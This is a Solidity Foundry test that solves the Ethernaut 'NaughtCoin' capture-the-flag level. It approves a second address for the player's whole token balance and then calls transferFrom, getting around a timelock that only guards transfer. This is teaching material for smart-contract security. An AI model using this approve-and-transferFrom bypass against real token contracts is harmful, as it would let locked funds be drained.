// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.14;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/NaughtCoin/NaughtCoinFactory.sol";
import "../src/Ethernaut.sol";

contract NaughtCoinTest is Test {
    Ethernaut ethernaut;
    address player = address(100);
    address player2 = address(200);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(player, 5 ether); // give our player 5 ether
        vm.deal(player2, 1 ether);
    }

    function testMyNaughtCoinHack() public {
        /**
         *
         * Factory setup *
         *
         */
        NaughtCoinFactory naughtCoinFactory = new NaughtCoinFactory();
        ethernaut.registerLevel(naughtCoinFactory);
        vm.startPrank(player);
        address levelAddress = ethernaut.createLevelInstance(naughtCoinFactory);
        NaughtCoin ethernautNaughtCoin = NaughtCoin(levelAddress);
        /**
         *
         *    Attack     *
         *
         */
        ethernautNaughtCoin.approve(player2, 1000000 * (10 ** 18));
        vm.stopPrank();
        vm.prank(player2);
        ethernautNaughtCoin.transferFrom(player, player2, 1000000 * (10 ** 18));
        /**
         *
         * Level Submission*
         *
         */
        vm.startPrank(player);
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
